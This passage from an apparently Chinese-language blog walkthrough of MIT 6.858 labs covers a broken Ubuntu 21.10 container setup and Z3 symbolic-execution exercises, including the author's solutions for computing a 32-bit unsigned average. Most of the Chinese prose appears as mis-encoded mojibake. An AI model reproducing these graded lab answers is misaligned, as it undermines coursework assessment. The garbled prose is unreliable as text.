class="hljs-string">&quot;containers from this run, you must run zookclean.py as root as well.&quot;</span>,<br>        file=sys.stderr)<br>    main()<br></code></pre></td></tr></table></figure>

<p>é‡Œé¢å­˜åœ¨è¿™æ ·ä¸€ä¸ªè°ƒç”¨é“¾ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">boot()<br>	Container.__init__()<br>    	Container.make_container()<br>        	Container.make_base()<br>            	Container.configure_base()<br></code></pre></td></tr></table></figure>

<p>åœ¨ <code>configure_base()</code> ä¸­æœ‰ç€ä¸€ä¸ªè°ƒç”¨ <code>apt-get</code> çš„é€»è¾‘ï¼Œç”±äº <strong>Ubuntu 21.10 å·²ç» <a target="_blank" rel="noopener" href="https://help.ubuntu.com/community/EOLUpgrades">EOL</a> äº†ï¼Œæ‰€ä»¥è¿™ä¸€æ­¥æ˜¯å¿…ç„¶ä¼šå¤±è´¥çš„</strong>ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">configure_base</span>(<span class="hljs-params">self</span>):<br>    <span class="hljs-comment"># ...</span><br>    <span class="hljs-comment"># install packages for zoobar</span><br>    <span class="hljs-comment"># terminate early if anything goes wrong here</span><br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;update&quot;</span>], extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed updating apt package info&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br>    r = self.run_cmd([<span class="hljs-string">&quot;apt-get&quot;</span>, <span class="hljs-string">&quot;install&quot;</span>, <span class="hljs-string">&quot;-y&quot;</span>] + pkgs, extra_env_vars=ev)<br>    <span class="hljs-keyword">if</span> r != <span class="hljs-number">0</span>:<br>        self.errormsg(<span class="hljs-string">&quot;Failed installing packages&quot;</span>)<br>        sys.exit(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure>

<blockquote>
<p>å‚è§ <a target="_blank" rel="noopener" href="https://askubuntu.com/questions/1420190/upgrade-to-22-04-impish-release-no-longer-has-a-release-file">ask ubuntu</a> ä¸ <a target="_blank" rel="noopener" href="https://fridge.ubuntu.com/2022/07/19/ubuntu-21-10-impish-indri-end-of-life-reached-on-july-14-2022/">Ubuntu Fridge</a></p>
<blockquote>
<p><del>ğŸ‘´çœŸçš„éº»äº†ï¼Œè¿™å®éªŒâ„¢æ˜¯ MIT ä»Šå¹´æ˜¥å­£å­¦æœŸå‘å¸ƒçš„ï¼Œç”¨ä¸ª 20.04 è¿™æ ·çš„ LTS ä¸å¥½ğŸï¼Œç”¨ä¸ªå°±åªå‰©å‡ ä¸ªğŸˆ·å¯¿å‘½çš„ 21.10 å°±ç¦»è°±</del></p>
</blockquote>
</blockquote>
<p>MIT ä¼°è®¡æ˜¯ä¸ä¼šä¿®è¿™ä¸ªé—®é¢˜äº†ï¼Œè€Œä¸‹ä¸€æ¬¡çš„å®éªŒæ‰‹å†Œå¾—ç­‰åˆ° 2023 å¹´çš„æ˜¥å­£å­¦æœŸæ‰èƒ½ä¸Šçº¿ï¼Œé‚£è¿™é‡Œç¬”è€…åªèƒ½è‡ªè¡Œå°è¯•è§£å†³è¿™ä¸ªé—®é¢˜äº†: (</p>
<p>è¿™é‡Œç¬”è€…è¯•äº†å¥½å‡ ç§æ–¹æ³•éƒ½æ²¡èƒ½æˆåŠŸå°† Ubuntu 21.10 å‡çº§æˆ 22.04 æˆ–æ˜¯å…¶ä»–çš„å¯ç”¨ç‰ˆæœ¬ï¼Œæœ€åç¬”è€…å°† <code>apt-get</code> æ›¿æ¢æˆ <code>apt</code> ä¹‹åå€’æ˜¯èƒ½è·‘äº†ï¼Œä¸è¿‡<strong>æ— æ³•æ­£å¸¸è®¿é—® zoobar æœåŠ¡å™¨</strong>ï¼Œä¼šæŠ¥ä¸€ä¸ª module not found ä½†æ˜¯å®é™…ä¸Šå·²ç»å®‰è£…æœ‰å¯¹åº”æ¨¡å—çš„é”™è¯¯ : (</p>
<blockquote>
<p>è¿™é‡Œå…ˆğŸ•Šäº†ï¼Œè¦æ˜¯ä¹‹åèƒ½é‡æ–°åšä¸Šå†è¡¥ï¼Œè¿˜å¥½å‡ ä¸ª lab ä¹‹é—´å¹¶éä¾èµ–å…³ç³»å¯ä»¥è®©ç¬”è€…å…ˆå¾€åç»§ç»­åš lab3 : )</p>
</blockquote>
<h1 id="0x03-Lab-3-Symbolic-execution"><a href="#0x03-Lab-3-Symbolic-execution" class="headerlink" title="0x03.Lab 3: Symbolic execution"></a>0x03.Lab 3: Symbolic execution</h1><h2 id="Introduction-1"><a href="#Introduction-1" class="headerlink" title="Introduction"></a>Introduction</h2><p>æœ¬ lab å°†æ•™å¤§å®¶ä½¿ç”¨ <strong>ç¬¦å·æ‰§è¡Œ</strong> ï¼ˆ<strong>symbolic execution</strong>ï¼‰ è¿™ä¸€å¼ºå¤§çš„æŠ€æœ¯æ¥å¯»æ‰¾è½¯ä»¶ä¸­çš„æ¼æ´ï¼Œåœ¨ lab çš„æœ€åæˆ‘ä»¬å°†å»ºç«‹ä¸€ä¸ªå¯ä»¥åœ¨ zoobar web åº”ç”¨ä¸­å¯»æ‰¾è§¦å‘å¤šç§æ¼æ´çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼ˆå‡†ç¡®çš„è¯´æ˜¯ä¸€ä¸ª<strong>æ··åˆæ‰§è¡Œ</strong>ï¼ˆconcolic executionï¼‰ç³»ç»Ÿï¼‰</p>
<blockquote>
<p>å…³äºä»€ä¹ˆæ˜¯ concolic executionï¼Œå¯ä»¥çœ‹è¿™å¼ å›¾</p>
<p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" srcset="/img/loading.gif" lazyload alt="concolic execution"></p>
</blockquote>
<p>åœ¨ <a target="_blank" rel="noopener" href="http://css.csail.mit.edu/6.858/2022/readings/exe.pdf">EXE paper</a> ä¸­æè¿°äº†ä¸€ä¸ªç”¨äº C ç¨‹åºçš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿï¼Œä¸ºäº†ç®€å•åŒ–ï¼Œè¯¥ lab å°†é€šè¿‡ä¿®æ”¹ Python å¯¹è±¡ä¸é‡è½½ç‰¹å®šæ–¹æ³•æ¥ä¸º Python ç¨‹åºå»ºç«‹ä¸€ä¸ªç¬¦å·&#x2F;æ··åˆæ‰§è¡Œç³»ç»Ÿï¼Œç±»ä¼¼äº EXEï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ª SMT ï¼ˆ <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Satisfiability_Modulo_Theories">Satisfiability Modulo Theories</a>ï¼Œå¯æ»¡è¶³æ€§æ¨¡ç†è®ºï¼‰æ±‚è§£å™¨æ¥æ£€æŸ¥å¯æ»¡è¶³çš„çº¦æŸï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬çš„æ±‚è§£å™¨å¯ä»¥æ£€æŸ¥åŒæ—¶åŒ…å«ä¼ ç»Ÿå¸ƒå°”å¯æ»¡è¶³æ€§è¡¨è¾¾å¼ä¸æ¶‰åŠå…¶ä»–â€œç†è®ºâ€çš„çº¦æŸå¦‚æ•´å‹ã€ä½å‘é‡ã€å­—ç¬¦ä¸²ç­‰</p>
<p>æœ¬ lab åˆå§‹æˆ‘ä»¬é¦–å…ˆè¦é€šè¿‡è®¡ç®— 32 ä½æœ‰&#x2F;æ— ç¬¦å·æ•°çš„å¹³å‡å€¼æ¥ç†Ÿæ‚‰ <strong>Z3</strong>â€”â€”ä¸€ä¸ªæµè¡Œçš„ SMT æ±‚è§£å™¨ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†ä¸º Python æ•´å‹æ“ä½œåˆ›å»º wrappersï¼ˆç±»ä¼¼ EXE æä¾›äº†ç¬¦å·å˜é‡ä¸Šçš„æ“ä½œç½®æ¢ï¼‰ï¼Œå¹¶åº”ç”¨è°ƒç”¨ Z3 çš„æ ¸å¿ƒé€»è¾‘æ¥æ¢ç´¢å¯èƒ½çš„ä¸åŒæ‰§è¡Œè·¯å¾„ï¼›æœ€ç»ˆæˆ‘ä»¬å°†æ¢ç´¢å¦‚ä½•å°†å…¶åº”ç”¨åœ¨ web åº”ç”¨ç¨‹åºä¸Šï¼Œä»¥å¯¹å­—ç¬¦ä¸²è¿›è¡Œæ±‚è§£ï¼Œæˆ‘ä»¬å°†ä¸º Python çš„å­—ç¬¦ä¸²æ“ä½œå¥—ä¸€å±‚ wrapperï¼Œåœ¨ SQLalchemy æ•°æ®åº“æ¥å£ä¸Šåº”ç”¨å¯¹ç¬¦å·åŒ–å‹å¥½çš„ï¼ˆsymbolic-friendlyï¼‰wrapperï¼Œå¹¶ä½¿ç”¨è¿™ä¸ªç³»ç»Ÿå¯»æ‰¾ Zoobar ä¸­çš„æ¼æ´</p>
<blockquote>
<p>ä¸Šé¢ä¸¤æ®µéƒ½æ˜¯æŠ„å®éªŒæ‰‹å†Œçš„</p>
</blockquote>
<p>æ¥ä¸‹æ¥é¦–å…ˆè¿˜æ˜¯æƒ¯ä¾‹åœ°åˆ‡æ¢åˆ° lab 3 çš„åˆ†æ”¯ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git commit -am <span class="hljs-string">&#x27;lab2 completed&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git pull</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">git checkout -b lab3 origin/lab3</span><br></code></pre></td></tr></table></figure>

<p>è¿™é‡Œæ³¨æ„ä¸è¦å°† lab 2 çš„ä»£ç åˆå¹¶åˆ° lab 3 é‡Œè¾¹ï¼Œå› ä¸ºæˆ‘ä»¬çš„ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ— æ³•é€šè¿‡ RPC è¿½è¸ªå¤šè¿›ç¨‹é—´çš„ç¬¦å·çº¦æŸï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ä¸€ä¸ªæ²¡æœ‰è¿›è¡Œæƒé™åˆ†ç¦»çš„ Zoobar ä¸Šè¿›è¡Œç¬¦å·æ‰§è¡Œ</p>
<p>æ¥ä¸‹æ¥æ˜¯æ£€æŸ¥ä»£ç å¯ç”¨æ€§ï¼š</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make check</span><br></code></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹å°±ğŸ†—ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç¬¦å·æ‰§è¡Œç³»ç»Ÿæ˜¯ CPU å¯†é›†å‹çš„ï¼Œå› æ­¤å¯¹äºä¸å¼€å¯ KVM æ”¯æŒçš„ QEMU è€Œè¨€ä¼šéå¸¸æ…¢ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/12/AlWaHU6RhcE3TpN.png" srcset="/img/loading.gif" lazyload alt="image.png">ã€</p>
<h2 id="Using-an-SMT-solver"><a href="#Using-an-SMT-solver" class="headerlink" title="Using an SMT solver"></a>Using an SMT solver</h2><p>ç¬¦å·æ‰§è¡Œçš„æ ¸å¿ƒæ˜¯ <strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®ºæ±‚è§£å™¨</strong>ï¼ˆ<strong>Satisfiability Modulo Theory solver</strong>ï¼Œ å³ <code>SMT solver</code>ï¼‰ï¼Œåœ¨æœ¬ lab ä¸­æˆ‘ä»¬å°†ä½¿ç”¨å¾®è½¯å¼€å‘çš„ <a target="_blank" rel="noopener" href="https://github.com/Z3Prover/z3">Z3 solver</a> çš„ Python-based APIï¼ˆå‚è§ <a target="_blank" rel="noopener" href="https://ericpony.github.io/z3py-tutorial/">z3py tutorial</a> &amp; <a target="_blank" rel="noopener" href="https://z3prover.github.io/api/html/namespacez3py.html">documentation for Z3â€™s Python API</a>ï¼‰ï¼Œå¹¶ä½¿ç”¨  <a target="_blank" rel="noopener" href="https://rise4fun.com/z3/tutorialcontent/sequences">Z3â€™s support for strings</a>ï¼›æœ¬ Lab å¸¦æœ‰ä¸€ä¸ªæ„å»ºè‡ª <a target="_blank" rel="noopener" href="https://github.com/Z3Prover/z3">Z3 github repo</a> çš„ Z3</p>
<p>å®éªŒæä¾›äº† <code>int-avg.py</code> ä½œä¸ºä½¿ç”¨ Z3 çš„ä¾‹å­ï¼š  <em>è®¡ç®—ä¸¤ä¸ª 32 ä½æ•´å‹çš„å¹³å‡å€¼</em>  ï¼Œä¸€ä¸ªæœ€ç®€å•çš„ç®—æ³•æ˜¯ <code>(x + y) / 2</code> ï¼Œä½†è¿™å¯èƒ½ä¼šå‘ç”Ÿ<strong>æ•´å‹ä¸Šæº¢</strong>ï¼Œä»è€Œå¾—åˆ°  <em>æ¨¡ 2<sup>32</sup></em> ä¸Šçš„å€¼ï¼ˆæƒ³äº†è§£æ›´å¤šï¼Œå‚è§  <a target="_blank" rel="noopener" href="https://people.csail.mit.edu/nickolai/papers/wang-kint-2013-06-24.pdf">KINT paper</a> ï¼‰â€”â€”Z3 å¯ä»¥å¸®æˆ‘ä»¬æ£€æŸ¥è¿™ä¸ªé”™è¯¯ï¼šäºˆå…¶ä¸€ä¸ªå¸ƒå°”è¡¨è¾¾å¼ï¼ŒZ3 å¯ä»¥å‘Šè¯‰æˆ‘ä»¬å…¶<strong>æ˜¯å¦ä¸ºçœŸ</strong>ï¼ˆå³å¯ä»¥è¢«æ»¡è¶³ï¼‰ï¼›è‹¥è¡¨è¾¾å¼å¯ä»¥ä¸ºçœŸä¸”åŒ…å«ä¸€äº›å˜é‡ï¼ŒZ3 å¯ä»¥ç»™æˆ‘ä»¬ä¸€äº›ä½¿è¡¨è¾¾å¼ä¸ºçœŸçš„ğŸŒ°å˜é‡</p>
<p>ç°åœ¨æˆ‘ä»¬æ¥çœ‹è¿™ä»½ä»£ç ï¼ˆè¿™é‡Œä¸ä¼šä»”ç»†è®² Z3 çš„ç”¨æ³•ï¼Œä¸æ‡‚çš„ <a target="_blank" rel="noopener" href="https://z3prover.github.io/api/html/">è‡ªè¡ŒæŸ¥æ–‡æ¡£</a>ï¼‰ï¼Œå…¶é¦–å…ˆä¼šä½¿ç”¨ Z3 åˆ›å»ºä¸¤ä¸ª 32 ä½çš„ä½å‘é‡ a ä¸ bï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><br><span class="hljs-keyword">import</span> z3<br><br><span class="hljs-comment">## Construct two 32-bit integer values.  Do not change this code.</span><br>a = z3.BitVec(<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-number">32</span>)<br>b = z3.BitVec(<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">32</span>)<br></code></pre></td></tr></table></figure>

<p>æ¥ä¸‹æ¥åˆ†åˆ«è®¡ç®—æœ‰&#x2F;æ— ç¬¦å·é™¤æ³•ä¸‹ä¸¤æ•°çš„å¹³å‡å€¼ï¼Œæ³¨æ„è¿™é‡Œ<strong>å¹¶æ²¡æœ‰å®é™…è¿›è¡Œè®¡ç®—ï¼Œè€Œä»…æ˜¯ä¿å­˜äº†ç¬¦å·å˜é‡è¡¨è¾¾å¼</strong>ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Compute the average of a and b.  The initial computation we provided</span><br><span class="hljs-comment">## naively adds them and divides by two, but that is not correct.  Modify</span><br><span class="hljs-comment">## these lines to implement your solution for both unsigned (u_avg) and</span><br><span class="hljs-comment">## signed (s_avg) division.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Watch out for the difference between signed and unsigned integer</span><br><span class="hljs-comment">## operations.  For example, the Z3 expression (x/2) performs signed</span><br><span class="hljs-comment">## division, meaning it treats the 32-bit value as a signed integer.</span><br><span class="hljs-comment">## Similarly, (x&gt;&gt;16) shifts x by 16 bits to the right, treating it</span><br><span class="hljs-comment">## as a signed integer.</span><br><span class="hljs-comment">##</span><br><span class="hljs-comment">## Use z3.UDiv(x, y) for unsigned division of x by y.</span><br><span class="hljs-comment">## Use z3.LShR(x, y) for unsigned (logical) right shift of x by y bits.</span><br>u_avg = z3.UDiv(a + b, <span class="hljs-number">2</span>)<br>s_avg = (a + b) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>ç”±äº 32 ä½æ•´æ•°åŠ æ³•å¯èƒ½å­˜åœ¨æº¢å‡ºï¼Œæ•…è¿™é‡Œä¸ºäº†æ±‚å¾—å…¶æ­£ç¡®çš„å¹³å‡å€¼ï¼Œæˆ‘ä»¬å°†å…¶æ‰©å±•ä¸ºä¸¤ä¸ª 33 ä½çš„ä½å‘é‡ï¼Œå®Œæˆè®¡ç®—åå†æˆªæ–­å› 32 ä½ï¼ˆä¸ä¼šå¯¼è‡´ç»“æœé”™è¯¯ï¼Œå› ä¸º 32 ä½çš„å¹³å‡å€¼æ€»ä¼šåœ¨ 32 ä½å†…ï¼‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">## Do not change the code below.</span><br><br><span class="hljs-comment">## To compute the reference answers, we extend both a and b by one</span><br><span class="hljs-comment">## more bit (to 33 bits), add them, divide by two, and shrink back</span><br><span class="hljs-comment">## down to 32 bits.  You are not allowed to &quot;cheat&quot; in this way in</span><br><span class="hljs-comment">## your answer.</span><br>az33 = z3.ZeroExt(<span class="hljs-number">1</span>, a)<br>bz33 = z3.ZeroExt(<span class="hljs-number">1</span>, b)<br>real_u_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, z3.UDiv(az33 + bz33, <span class="hljs-number">2</span>))<br><br>as33 = z3.SignExt(<span class="hljs-number">1</span>, a)<br>bs33 = z3.SignExt(<span class="hljs-number">1</span>, b)<br>real_s_avg = z3.Extract(<span class="hljs-number">31</span>, <span class="hljs-number">0</span>, (as33 + bs33) / <span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure>

<p>æœ€åå°±æ˜¯æ±‚è§£æ˜¯å¦å­˜åœ¨èƒ½å¤Ÿå‘ç”Ÿæ•´å‹æº¢å‡ºçš„çº¦æŸï¼Œå³ï¼šæ˜¯å¦å­˜åœ¨è¿™æ ·çš„ä¸¤ä¸ª 32 ä½æ•´å‹å˜é‡å€¼ä½¿å¾—å…¶ 32 ä½ä¸‹è¿ç®—ç»“æœä¸ä¸çœŸå®è®¡ç®—ç»“æœç›¸ç­‰ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_val</span>(<span class="hljs-params">v, signed</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(v) == z3.BitVecNumRef:<br>        <span class="hljs-keyword">if</span> signed:<br>            v = v.as_signed_long()<br>        <span class="hljs-keyword">else</span>:<br>            v = v.as_long()<br>    <span class="hljs-keyword">return</span> v<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printable_model</span>(<span class="hljs-params">m, signed</span>):<br>    vals = &#123;&#125;<br>    <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> m:<br>        vals[k] = printable_val(m[k], signed)<br>    <span class="hljs-keyword">return</span> vals<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do_check</span>(<span class="hljs-params">msg, signed, avg, real_avg</span>):<br>    e = (avg != real_avg)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Checking&quot;</span>, msg, <span class="hljs-string">&quot;using Z3 expression:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;    &quot;</span> + <span class="hljs-built_in">str</span>(e).replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;\n    &quot;</span>))<br>    solver = z3.Solver()<br>    solver.add(e)<br>    ok = solver.check()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Answer for %s: %s&quot;</span> % (msg, ok))<br><br>    <span class="hljs-keyword">if</span> ok == z3.sat:<br>        m = solver.model()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Example:&quot;</span>, printable_model(m, signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Your average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(avg), signed))<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;  Real average:&quot;</span>, printable_val(m.<span class="hljs-built_in">eval</span>(real_avg), signed))<br></code></pre></td></tr></table></figure>

<p>ç»“æœå¦‚ä¸‹ï¼ŒZ3 æ±‚è§£å™¨å¸®åŠ©æˆ‘ä»¬æ‰¾åˆ°äº†è¿™æ ·çš„å€¼ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/12/LekmYMWvfAUSNwy.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>æ¥ä¸‹æ¥æ˜¯ Exercise 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>u_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„æ— ç¬¦å·å¹³å‡å€¼ï¼Œä¸èƒ½æ”¹å˜æ“ä½œæ•°çš„ä½å®½</p>
<blockquote>
<p><strong>Exercise 1.</strong> Implement a correct function to compute the unsigned average of <code>a</code> and <code>b</code> using only 32-bit arithmetic, by modifying the <code>u_avg = ...</code> line in <code>int-avg.py</code>.</p>
<p>For the purposes of this exercise, you are not allowed to change the bit-widths of your operands. This is meant to represent the real world, where you cannot just add one more bit to your CPUâ€™s register width.</p>
<p>You may find it helpful to search online for correct ways to perform fixed-width integer arithmetic. The book <a target="_blank" rel="noopener" href="https://web.archive.org/web/20190915025154/http://www.hackersdelight.org/">Hackerâ€™s Delight</a> by Henry S. Warren is a particularly good source of such tricks.</p>
<p>Check your averaging function by re-running <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong>. If your implementation is correct, <code>int-avg.py</code> should produce the message <code>Answer for unsigned avg: unsat</code>.</p>
</blockquote>
<p>è¿™é‡Œç¬”è€…ç»™å‡ºä¸€ä¸ªæ¯”è¾ƒç¬¨çš„è§£æ³•ï¼ˆæ¯•ç«Ÿç¬”è€…çš„è„‘å­:  (ä¹Ÿæƒ³ä¸å‡ºå•¥èªæ˜è§£æ³• ï¼‰ï¼š</p>
<ul>
<li><strong><code>(a / 2) + (b / 2) + ((a % 2) + (b % 2)) / 2</code></strong></li>
</ul>
<p>è¿™ä¸ªç®—æ³•çš„æ€è·¯æ¯”è¾ƒç®€å•ï¼Œæœ€åˆçš„å‡ºå‘ç‚¹å°±æ˜¯ä¸¤æ•°ä¹‹å’Œçš„å¹³å‡å€¼ä¸ä¼šè¶…å‡º 2<sup>32</sup>ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦å…ˆå°†ä¸¤æ•°åˆ†åˆ«é™¤ä»¥2å†ç›¸åŠ å°±ä¸ä¼šå‘ç”Ÿæº¢å‡ºäº†ï¼Œä½†æ˜¯å¥‡æ•°é™¤ä»¥2ä¼šä¸¢å¤± 0.5ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªæ•°éƒ½æ˜¯å¥‡æ•°çš„è¯æœ€åçš„ç»“æœä¼šä¸¢æ‰1ï¼Œé‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å†å°†å…¶åŠ ä¸Šå³å¯</p>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ Z3 <strong>é»˜è®¤ä¸ºå¸¦ç¬¦å·è¿ç®—</strong>ï¼Œæ•…è¿™é‡Œæˆ‘ä»¬åº”å½“ä½¿ç”¨ <code>z3.UDiv()</code> æ¥è¿›è¡Œ<strong>æ— ç¬¦å·</strong>é™¤æ³•è¿ç®—ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">u_avg = z3.UDiv(a, <span class="hljs-number">2</span>) + z3.UDiv(b, <span class="hljs-number">2</span>) + ((a % <span class="hljs-number">2</span>) + (b % <span class="hljs-number">2</span>)) / <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>è¿è¡Œ <code>make check</code>ï¼ŒæˆåŠŸé€šè¿‡ Exercise 1ï¼š</p>
<p><img src="https://s2.loli.net/2022/12/12/RhY7t1pxyVSb5eH.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>é™¤äº†è¿™ä¸ªç®—æ³•ä¹‹å¤–ï¼Œç¬”è€…è¿˜äº†è§£åˆ°æœ‰ä¸€ç§ç®—æ³•æ˜¯åˆ©ç”¨<strong>ä½è¿ç®—</strong>æ¥è¿›è¡Œè®¡ç®—ï¼š</p>
<ul>
<li><code>(a &amp; b) + ((a ^ b) &gt;&gt; 1)</code></li>
</ul>
<p>è¿™ä¸ªç®—æ³•çš„åŸºæœ¬åŸç†æ˜¯å…ˆæå–å‡º<strong>å…¬æœ‰éƒ¨åˆ†</strong>ï¼Œå†è®¡ç®—<strong>ç§æœ‰éƒ¨åˆ†çš„å¹³å‡å€¼</strong>ï¼Œæœ€åç›¸åŠ å³å¯å¾—åˆ°ç»“æœï¼›è¿™ä¸ªç®—æ³•ä¹Ÿèƒ½é€šè¿‡ Exercise 1 ï¼Œè¿™é‡Œå°±ä¸é‡å¤è´´å›¾äº†</p>
<p>æ¥ä¸‹æ¥æ˜¯ Challenge 1ï¼šé€šè¿‡ä¿®æ”¹  <code>int-avg.py</code> ä¸­çš„ <code>s_avg = ...</code> ä¸€è¡Œï¼Œå®ç°ä¸€ä¸ªæ­£ç¡®çš„å‡½æ•°ï¼Œä»¥åœ¨ 32 ä½è¿ç®—ä¸‹æ­£ç¡®è®¡ç®—å‡º a ä¸ b çš„<strong>æœ‰ç¬¦å·å¹³å‡å€¼</strong></p>
<blockquote>
<p><em>Challenge! (optional)</em> For extra credit, figure out how to compute the average of two 32-bit <em>signed</em> values. Modify the <code>s_avg = ...</code> line in <code>int-avg.py</code>, and run <strong>.&#x2F;int-avg.py</strong> or <strong>make check</strong> to check your answer. Keep in mind the direction of rounding: 3&#x2F;2&#x3D;1 and -3&#x2F;2&#x3D;-1, so so the average of 1 and 2 should be 1, and the average of -2 and -1 should be -1.</p>
<p>As you explore signed arithmetic, you may find it useful to know that Z3 has two different modulo-like operators. The first is signed modulo, which you get by using <code>a % b</code> in the Python Z3 API. Here, the sign of the result follows the sign of the divisor (i.e., <code>b</code>). For example, <code>-5 % 2 = 1</code>. The second is signed remainder, which you get by using <code>z3.SRem(a, b)</code>. Here, the sign of the result follows the sign of the dividend (i.e., <code>a</code>). With the same example inputs, <code>z3.SRem(-5, 2) = -1</code>.</p>
</blockquote>
